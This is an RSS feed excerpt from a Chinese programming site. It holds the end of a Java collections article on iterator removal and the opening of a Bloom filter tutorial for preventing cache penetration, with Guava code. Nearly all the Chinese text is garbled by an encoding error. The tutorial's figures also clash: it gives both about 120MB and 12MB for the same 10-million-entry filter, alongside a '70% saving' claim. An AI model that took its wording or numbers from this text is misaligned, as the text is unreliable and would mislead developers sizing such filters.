<p>å½“è¿­ä»£å™¨ç»§ç»­ä¸‹ä¸€æ¬¡next()æ“ä½œæ—¶ï¼Œå®ƒä¼šå‘ç°"è´¦å¯¹ä¸ä¸Šäº†"ï¼Œç„¶åé©¬ä¸Šå°±æŠ›å‡ºConcurrentModificationExceptionï¼ˆå¹¶å‘ä¿®æ”¹å¼‚å¸¸ï¼‰æ¥é˜²æ­¢åé¢å¯èƒ½å‘ç”Ÿæ›´ä¸¥é‡çš„æ•°æ®é”™ä¹±é—®é¢˜ã€‚</p>
<p>æ¨èçš„éå†åˆ é™¤æ–¹å¼å°±æ˜¯ä½¿ç”¨è¿­ä»£å™¨çš„remove()æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-java" lang="java">Iterator&lt;String&gt; iterator = list.iterator();
        <span class="hljs-keyword">while</span> (iterator.hasNext()) {
            <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> iterator.next();
            <span class="hljs-keyword">if</span> (<span class="hljs-string">"æ‡’æƒ°"</span>.equals(str)) {
                iterator.remove();
            }
        }
</code></pre>
<p>iterator.remove()ä¼šé€šçŸ¥é›†åˆæœ¬æ¬¡ä¿®æ”¹ï¼Œç¡®ä¿æ•°æ®çš„ä¸€è‡´æ€§ï¼Œå› æ­¤æ˜¯å”¯ä¸€æ¨èåœ¨éå†æ—¶ä¿®æ”¹é›†åˆçš„æ–¹å¼ã€‚</p>
<blockquote>
<p>åœ¨å®é™…å¼€å‘ä¸­ï¼Œå¿…é¡»ä½¿ç”¨è¿­ä»£å™¨çš„remove()æˆ–removeIfæ¥ä¿è¯ä»£ç çš„å¥å£®æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p>
</blockquote>
<h2 data-id="heading-6">ç»“è¯­</h2>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬ç®—æ˜¯å¼€å§‹äº†ä¸€ä¸ªJavaæ–°æ¿å—çš„å­¦ä¹ ã€‚</p>
<p>æˆ‘ä»¬äº†è§£äº†Javaé›†åˆæ¡†æ¶æ˜¯ä»€ä¹ˆã€å®ƒçš„å®è§‚æ¶æ„ï¼Œäº†è§£äº†æ ¹æ¥å£Collectionæ‰€å®šä¹‰çš„é€šç”¨èƒ½åŠ›ã€‚</p>
<p>ç„¶åèŠäº†ä¸€ä¸‹è¿­ä»£å™¨å’ŒConcurrentModificationExceptionã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬ä¼šçœ‹ä¸€ä¸‹é›†åˆæ¡†æ¶ä¸‹çš„ä¸€äº›å…·ä½“å®ç°ã€‚</p>
<p>ä¸‹ä¸€ç¯‡é¢„å‘Š</p>
<blockquote>
<p>Day27 | Listæ¥å£è¯¦è§£</p>
</blockquote>
<p>å¦‚æœä½ è§‰å¾—è¿™ç³»åˆ—æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œæ¬¢è¿å…³æ³¨ä¸“æ ï¼Œæˆ‘ä»¬ä¸€èµ·åšæŒä¸‹å»ï¼</p>
<p><strong>æ›´å¤šæ–‡ç« è¯·å…³æ³¨æˆ‘çš„å…¬ä¼—å·ã€Šæ‡’æƒ°èœ—ç‰›å·¥åŠã€‹</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¼“å­˜è¢«æ‰“ç©¿ï¼Ÿ1000ä¸‡æ•°æ®åªç”¨12MBå†…å­˜ï¼šå¸ƒéš†è¿‡æ»¤å™¨å®æˆ˜æŒ‡å—]]></title>    <link>https://juejin.cn/post/7581738974424350739</link>    <guid>https://juejin.cn/post/7581738974424350739</guid>    <pubDate>2025-12-10T01:27:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581738974424350739" data-draft-id="7581738974424334355" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¼“å­˜è¢«æ‰“ç©¿ï¼Ÿ1000ä¸‡æ•°æ®åªç”¨12MBå†…å­˜ï¼šå¸ƒéš†è¿‡æ»¤å™¨å®æˆ˜æŒ‡å—"/> <meta itemprop="keywords" content="åç«¯,é¢è¯•,æ¶æ„"/> <meta itemprop="datePublished" content="2025-12-10T01:27:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¸æµªæ— ç—•"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¼“å­˜è¢«æ‰“ç©¿ï¼Ÿ1000ä¸‡æ•°æ®åªç”¨12MBå†…å­˜ï¼šå¸ƒéš†è¿‡æ»¤å™¨å®æˆ˜æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¸æµªæ— ç—•
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:27:37.000Z" title="Wed Dec 10 2025 01:27:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>æœ€è¿‘åœ¨åšç³»ç»Ÿæ€§èƒ½ä¼˜åŒ–ï¼Œå‘ç°ä¸€ä¸ªå¯ä»¥ä¼˜åŒ–çš„ç‚¹ï¼šå¤§é‡è¯·æ±‚åœ¨æŸ¥è¯¢ä¸å­˜åœ¨çš„ç”¨æˆ·IDï¼Œæ¯æ¬¡éƒ½è¦ç©¿é€Redisç¼“å­˜å»æŸ¥MySQLã€‚è™½ç„¶æœ‰ç¼“å­˜ç©ºå€¼çš„æœºåˆ¶ï¼Œä½†å†…å­˜å ç”¨è¿˜æ˜¯å¾ˆå¤§ã€‚</p>
<p>å›¢é˜Ÿè®¨è®ºæ—¶ï¼Œæœ‰äººæåˆ°ç”¨å¸ƒéš†è¿‡æ»¤å™¨æ¥è§£å†³ã€‚æˆ‘ç ”ç©¶äº†ä¸€ä¸‹ï¼Œå‘ç°è¿™ä¸ªæ–¹æ¡ˆç¡®å®åˆé€‚ï¼š1000ä¸‡ç”¨æˆ·æ•°æ®ï¼ŒHashSetè¦400MBå†…å­˜ï¼Œå¸ƒéš†è¿‡æ»¤å™¨åªéœ€è¦12MBï¼Œè¿˜èƒ½æŒ¡ä½99%çš„æ— æ•ˆè¯·æ±‚ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« è®°å½•äº†æˆ‘ä»åŸç†ã€å‚æ•°è°ƒä¼˜åˆ°åˆ†å¸ƒå¼å®æˆ˜çš„å®Œæ•´è¿‡ç¨‹ã€‚æ— è®ºä½ æ˜¯ç¬¬ä¸€æ¬¡å¬è¯´å¸ƒéš†è¿‡æ»¤å™¨ï¼Œè¿˜æ˜¯å‡†å¤‡åœ¨ç”Ÿäº§ç¯å¢ƒç”¨å®ƒï¼Œéƒ½èƒ½æ‰¾åˆ°æœ‰ä»·å€¼çš„å†…å®¹ã€‚</p>
<p><strong>é˜…è¯»å»ºè®®ï¼š</strong></p>
<ul>
<li>æƒ³å¿«é€Ÿè§£å†³é—®é¢˜ï¼Ÿç›´æ¥è·³åˆ°ã€Œå…­ã€å®é™…å·¥ä½œä¸­çš„åº”ç”¨åœºæ™¯ã€</li>
<li>æƒ³ç†è§£åŸç†ï¼Ÿç²¾è¯»ã€Œä¸€ã€å¸ƒéš†è¿‡æ»¤å™¨çš„æœ¬è´¨ã€</li>
<li>å‡†å¤‡ä¸Šç”Ÿäº§ï¼Ÿé‡ç‚¹çœ‹ã€Œä¸ƒã€ä½¿ç”¨æ³¨æ„äº‹é¡¹ã€</li>
<li>æŠ€æœ¯é€‰å‹æˆ–é¢è¯•ï¼Ÿå…³æ³¨ã€Œå…«ã€æ€»ç»“ã€</li>
</ul>
<h2 data-id="heading-1">ä¸€ã€å¸ƒéš†è¿‡æ»¤å™¨çš„æœ¬è´¨</h2>
<h3 data-id="heading-2">1.1 è§£å†³ä»€ä¹ˆé—®é¢˜</h3>
<p>æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸ªå®é™…åœºæ™¯ã€‚å‡è®¾ç³»ç»Ÿæœ‰1000ä¸‡æ³¨å†Œç”¨æˆ·ï¼Œç°åœ¨éœ€è¦å¿«é€Ÿåˆ¤æ–­ä¸€ä¸ªç”¨æˆ·IDæ˜¯å¦å­˜åœ¨ã€‚</p>
<p>å¸¸è§„æ–¹æ¡ˆå¯¹æ¯”ï¼š</p>
<p><strong>æ–¹æ¡ˆ1ï¼šHashSet</strong></p>
<pre><code class="hljs language-java" lang="java">Set&lt;Long&gt; userIds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();
<span class="hljs-comment">// åŠ è½½1000ä¸‡ç”¨æˆ·ID</span>
userIds.contains(userId);  <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦å­˜åœ¨</span>
</code></pre>
<p>å†…å­˜å ç”¨ï¼š</p>
<ul>
<li>Longç±»å‹ï¼š8å­—èŠ‚</li>
<li>HashSeté¢å¤–å¼€é”€ï¼šçº¦32å­—èŠ‚/å…ƒç´ </li>
<li>æ€»è®¡ï¼š1000ä¸‡ Ã— 40å­—èŠ‚ = 400MB</li>
</ul>
<p><strong>æ–¹æ¡ˆ2ï¼šå¸ƒéš†è¿‡æ»¤å™¨</strong></p>
<pre><code class="hljs language-java" lang="java">BloomFilter&lt;Long&gt; filter = BloomFilter.create(
    Funnels.longFunnel(),
    <span class="hljs-number">10_000_000</span>,  <span class="hljs-comment">// 1000ä¸‡</span>
    <span class="hljs-number">0.01</span>         <span class="hljs-comment">// 1%è¯¯åˆ¤ç‡</span>
);
filter.mightContain(userId);  <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦å­˜åœ¨</span>
</code></pre>
<p>å†…å­˜å ç”¨ï¼š</p>
<ul>
<li>çº¦120MB</li>
</ul>
<p><strong>èŠ‚çœäº†70%çš„å†…å­˜ï¼</strong></p>
<p>ä½†å¸ƒéš†è¿‡æ»¤å™¨æœ‰ä¸ªç‰¹ç‚¹ï¼šå®ƒä¼šæœ‰è¯¯åˆ¤ã€‚å…·ä½“æ¥è¯´ï¼š</p>
<ul>
<li>å¦‚æœå®ƒè¯´"ä¸å­˜åœ¨"ï¼Œé‚£ä¸€å®šä¸å­˜åœ¨</li>
<li>å¦‚æœå®ƒè¯´"å¯èƒ½å­˜åœ¨"ï¼Œé‚£å¯èƒ½æ˜¯è¯¯åˆ¤</li>
</ul>
<p>è¿™ä¸ªç‰¹æ€§å†³å®šäº†å®ƒçš„ä½¿ç”¨åœºæ™¯ã€‚</p>
<h3 data-id="heading-3">1.2 å·¥ä½œåŸç†</h3>
<p>å¸ƒéš†è¿‡æ»¤å™¨çš„æ ¸å¿ƒæ•°æ®ç»“æ„æ˜¯ä¸€ä¸ªå¾ˆé•¿çš„bitæ•°ç»„ï¼ŒåŠ ä¸Šè‹¥å¹²ä¸ªHashå‡½æ•°ã€‚</p>
<p><strong>æ·»åŠ å…ƒç´ çš„è¿‡ç¨‹ï¼š</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[å…ƒç´  hello] --&gt; B[Hash1]
    A --&gt; C[Hash2]
    A --&gt; D[Hash3]
    B --&gt; E[ä½ç½®3 = 1]
    C --&gt; F[ä½ç½®7 = 1]
    D --&gt; G[ä½ç½®12 = 1]
    E --&gt; H[bitæ•°ç»„]
    F --&gt; H
    G --&gt; H
</code></pre>
<p><strong>æŸ¥è¯¢å…ƒç´ çš„è¿‡ç¨‹ï¼š</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[æŸ¥è¯¢ hello] --&gt; B[Hash1]
    A --&gt; C[Hash2]
    A --&gt; D[Hash3]
    B --&gt; E{ä½ç½®3æ˜¯1?}
    C --&gt; F{ä½ç½®7æ˜¯1?}
    D --&gt; G{ä½ç½®12æ˜¯1?}
    E --&gt; H{éƒ½æ˜¯1?}
    F --&gt; H
    G --&gt; H
    H --&gt;|æ˜¯| I[å¯èƒ½å­˜åœ¨]
    H --&gt;|å¦| J[ä¸€å®šä¸å­˜åœ¨]
</code></pre>
<p>ç”¨ä»£ç è¡¨ç¤ºå°±æ˜¯ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// bitæ•°ç»„</span>
<span class="hljs-type">boolean</span>[] bits = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">1000000</span>];

<span class="hljs-comment">// æ·»åŠ å…ƒç´ </span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(String key)</span> {
    bits[hash1(key) % bits.length] = <span class="hljs-literal">true</span>;
    bits[hash2(key) % bits.length] = <span class="hljs-literal">true</span>;
    bits[hash3(key) % bits.length] = <span class="hljs-literal">true</span>;
}

<span class="hljs-comment">// æŸ¥è¯¢å…ƒç´ </span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(String key)</span> {
    <span class="hljs-keyword">return</span> bits[hash1(key) % bits.length]
        &amp;&amp; bits[hash2(key) % bits.length]
        &amp;&amp; bits[hash3(key) % bits.length];
}
</code></pre>
<p>æ ¸å¿ƒå°±è¿™ä¹ˆç®€å•ï¼šç”¨å¤šä¸ªHashå‡½æ•°æ˜ å°„åˆ°bitæ•°ç»„çš„ä¸åŒä½ç½®ï¼Œæ‰“ä¸Šæ ‡è®°ã€‚</p>
<h3 data-id="heading-4">1.3 ä¸ºä»€ä¹ˆä¼šè¯¯åˆ¤</h3>
<p>çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p>
<pre><code class="hljs language-css" lang="css">æ·»åŠ  "hello":
  <span class="hljs-built_in">hash1</span>(<span class="hljs-string">"hello"</span>) â†’ ä½ç½®<span class="hljs-number">3</span> âœ“
  <span class="hljs-built_in">hash2</span>(<span class="hljs-string">"hello"</span>) â†’ ä½ç½®<span class="hljs-number">7</span> âœ“
  <span class="hljs-built_in">hash3</span>(<span class="hljs-string">"hello"</span>) â†’ ä½ç½®<span class="hljs-number">12</span> âœ“

æ·»åŠ  <span class="hljs-string">"world"</span>:
  <span class="hljs-built_in">hash1</span>(<span class="hljs-string">"world"</span>) â†’ ä½ç½®<span class="hljs-number">5</span> âœ“
  <span class="hljs-built_in">hash2</span>(<span class="hljs-string">"world"</span>) â†’ ä½ç½®<span class="hljs-number">3</span> âœ“  (å’Œhelloå†²çª)
  <span class="hljs-built_in">hash3</span>(<span class="hljs-string">"world"</span>) â†’ ä½ç½®<span class="hljs-number">9</span> âœ“

æ­¤æ—¶bitæ•°ç»„: [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,...]
               ä½ç½®:  <span class="hljs-number">3</span>   <span class="hljs-number">5</span>   <span class="hljs-number">7</span>   <span class="hljs-number">9</span>      <span class="hljs-number">12</span>

æŸ¥è¯¢ <span class="hljs-string">"java"</span>:
  <span class="hljs-built_in">hash1</span>(<span class="hljs-string">"java"</span>) â†’ ä½ç½®<span class="hljs-number">3</span>  (è¢«helloå äº†)
  <span class="hljs-built_in">hash2</span>(<span class="hljs-string">"java"</span>) â†’ ä½ç½®<span class="hljs-number">7</span>  (è¢«helloå äº†)
  <span class="hljs-built_in">hash3</span>(<span class="hljs-string">"java"</span>) â†’ ä½ç½®<span class="hljs-number">9</span>  (è¢«worldå äº†)
  
ä¸‰ä¸ªä½ç½®éƒ½æ˜¯<span class="hljs-number">1</span>ï¼Œè¯¯åˆ¤ä¸ºå­˜åœ¨ï¼
</code></pre>
<p>éšç€æ’å…¥çš„å…ƒç´ è¶Šæ¥è¶Šå¤šï¼Œbitæ•°ç»„ä¸­1çš„å¯†åº¦è¶Šæ¥è¶Šé«˜ï¼Œè¯¯åˆ¤çš„æ¦‚ç‡ä¹Ÿä¼šå¢åŠ ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆéœ€è¦åˆç†è®¾ç½®å‚æ•°ã€‚</p>
<p><strong>ä½†åˆ«æ‹…å¿ƒè¿™1%çš„è¯¯åˆ¤</strong>ï¼šå®ƒåªæ˜¯è®©ä½ å¤šæŸ¥ä¸€æ¬¡æ•°æ®åº“ï¼Œè€Œä¸æ˜¯è¿”å›é”™è¯¯ç»“æœã€‚å¯¹äºé˜²ç¼“å­˜ç©¿é€è¿™ç§åœºæ™¯ï¼Œå·²ç»æŒ¡ä½äº†99%çš„æ— æ•ˆè¯·æ±‚ï¼Œå®Œå…¨å¤Ÿç”¨ã€‚</p>
<h2 data-id="heading-5">äºŒã€å‚æ•°çš„æ•°å­¦åŸç†</h2>
<h3 data-id="heading-6">2.1 å…³é”®å‚æ•°</h3>
<p>å¸ƒéš†è¿‡æ»¤å™¨æœ‰ä¸‰ä¸ªæ ¸å¿ƒå‚æ•°ï¼š</p>
<ul>
<li><strong>n</strong>: é¢„æœŸæ’å…¥çš„å…ƒç´ ä¸ªæ•°</li>
<li><strong>p</strong>: æœŸæœ›çš„è¯¯åˆ¤ç‡</li>
<li><strong>m</strong>: bitæ•°ç»„çš„é•¿åº¦</li>
<li><strong>k</strong>: Hashå‡½æ•°çš„ä¸ªæ•°</li>
</ul>
<p>å‰ä¸¤ä¸ªæ˜¯æˆ‘ä»¬è®¾ç½®çš„ï¼Œåä¸¤ä¸ªæ˜¯è‡ªåŠ¨è®¡ç®—å‡ºæ¥çš„ã€‚</p>
<h3 data-id="heading-7">2.2 å‚æ•°æ€ä¹ˆç®—å‡ºæ¥çš„</h3>
<p>ä½ åªéœ€è¦å‘Šè¯‰å¸ƒéš†è¿‡æ»¤å™¨ä¸¤ä¸ªæ•°å­—ï¼Œå®ƒå°±èƒ½è‡ªåŠ¨ç®—å‡ºéœ€è¦å¤šå¤§çš„ç©ºé—´å’Œå¤šå°‘ä¸ªHashå‡½æ•°ã€‚</p>
<p><strong>ä½ è®¾ç½®ï¼š</strong></p>
<ul>
<li>é¢„è®¡å­˜å¤šå°‘ä¸ªå…ƒç´ ï¼ˆæ¯”å¦‚1000ä¸‡ï¼‰</li>
<li>èƒ½æ¥å—å¤šå°‘è¯¯åˆ¤ç‡ï¼ˆæ¯”å¦‚1%ï¼‰</li>
</ul>
<p><strong>å®ƒè‡ªåŠ¨è®¡ç®—ï¼š</strong></p>
<ul>
<li>éœ€è¦å¤šå¤§çš„bitæ•°ç»„</li>
<li>éœ€è¦å‡ ä¸ªHashå‡½æ•°</li>
</ul>
<p><strong>ä¸¾ä¸ªä¾‹å­ï¼š</strong></p>
<pre><code class="hljs language-diff" lang="diff">æˆ‘è¯´ï¼šè¦å­˜1000ä¸‡ä¸ªç”¨æˆ·IDï¼Œè¯¯åˆ¤ç‡æ§åˆ¶åœ¨1%

å¸ƒéš†è¿‡æ»¤å™¨ç®—å‡ºæ¥ï¼š
<span class="hljs-deletion">- bitæ•°ç»„ï¼šéœ€è¦12MBå†…å­˜</span>
<span class="hljs-deletion">- Hashå‡½æ•°ï¼šéœ€è¦7ä¸ª</span>
</code></pre>
<p>å…·ä½“çš„æ•°å­¦å…¬å¼å¾ˆå¤æ‚ï¼Œä½†å¥½åœ¨Guavaå·²ç»å¸®æˆ‘ä»¬å°è£…å¥½äº†ï¼Œç›´æ¥ç”¨å°±è¡Œï¼š</p>
<pre><code class="hljs language-java" lang="java">BloomFilter.create(
    Funnels.longFunnel(),
    <span class="hljs-number">10_000_000</span>,  <span class="hljs-comment">// å‘Šè¯‰å®ƒï¼š1000ä¸‡å…ƒç´ </span>
    <span class="hljs-number">0.01</span>         <span class="hljs-comment">// å‘Šè¯‰å®ƒï¼š1%è¯¯åˆ¤ç‡</span>
);
<span class="hljs-comment">// å‰©ä¸‹çš„å®ƒè‡ªå·±ç®—</span>
</code></pre>
<h3 data-id="heading-8">2.3 ä¸åŒå‚æ•°çš„å¯¹æ¯”</h3>















































<table><thead><tr><th>å…ƒç´ æ•°é‡</th><th>è¯¯åˆ¤ç‡</th><th>å†…å­˜å ç”¨</th><th>Hashå‡½æ•°æ•°</th></tr></thead><tbody><tr><td>100ä¸‡</td><td>1%</td><td>1.2 MB</td><td>7</td></tr><tr><td>100ä¸‡</td><td>0.1%</td><td>1.8 MB</td><td>10</td></tr><tr><td>1000ä¸‡</td><td>1%</td><td>12 MB</td><td>7</td></tr><tr><td>1000ä¸‡</td><td>0.1%</td><td>18 MB</td><td>10</td></tr><tr><td>1äº¿</td><td>1%</td><td>120 MB</td><td>7</td></tr><tr><td>1äº¿</td><td>0.1%</td><td>180 MB</td><td>10</td></tr></tbody></table>
<p><strong>ç»éªŒæ³•åˆ™ï¼š</strong> 1%è¯¯åˆ¤ç‡ä¸‹ï¼Œæ¯ä¸ªå…ƒç´ çº¦éœ€1.2å­—èŠ‚ï¼Œè¿œä½äºHashSetçš„40+å­—èŠ‚ã€‚çœä¸‹çš„å‡ ç™¾MBå†…å­˜ï¼Œå¯èƒ½å°±æ˜¯ä½ çš„æœåŠ¡èƒ½å¦å¡è¿›å®¹å™¨çš„å…³é”®ã€‚</p>
<p>ä»è¡¨æ ¼å¯ä»¥çœ‹å‡ºï¼š</p>
<ul>
<li>è¯¯åˆ¤ç‡é™ä½10å€ï¼Œå†…å­˜å¢åŠ çº¦50%</li>
<li>Hashå‡½æ•°ä¸ªæ•°ä¸»è¦å—è¯¯åˆ¤ç‡å½±å“</li>
<li>å…ƒç´ æ•°é‡å¢åŠ 10å€ï¼Œå†…å­˜ä¹Ÿå¢åŠ çº¦10å€</li>
</ul>
<h3 data-id="heading-9">2.4 å‚æ•°é€‰æ‹©å»ºè®®</h3>
<p><strong>è¯¯åˆ¤ç‡çš„é€‰æ‹©ï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">é«˜ç²¾åº¦åœºæ™¯(é‡‘èã€å®‰å…¨): 0.001 (0.1%)</span>
<span class="hljs-section">å¸¸è§„ä¸šåŠ¡åœºæ™¯: 0.01 (1%)</span>
<span class="hljs-section">å®½æ¾åœºæ™¯(æ—¥å¿—å»é‡): 0.03 (3%)</span>
</code></pre>
<p><strong>å…ƒç´ æ•°é‡çš„é¢„ä¼°ï¼š</strong></p>
<p>è¿™ä¸ªéå¸¸å…³é”®ã€‚å¦‚æœé¢„ä¼°ä¸å‡†ç¡®ï¼Œä¼šå¯¼è‡´å®é™…è¯¯åˆ¤ç‡è¿œé«˜äºé¢„æœŸã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é”™è¯¯ç¤ºä¾‹ï¼šé¢„ä¼°10ä¸‡ï¼Œå®é™…æ’å…¥100ä¸‡</span>
BloomFilter&lt;Long&gt; filter = BloomFilter.create(
    Funnels.longFunnel(),
    <span class="hljs-number">100_000</span>,   <span class="hljs-comment">// é¢„ä¼°å¤ªå°</span>
    <span class="hljs-number">0.01</span>
);

<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1_000_000</span>; i++) {
    filter.put(i);  <span class="hljs-comment">// å®é™…æ’å…¥100ä¸‡</span>
}

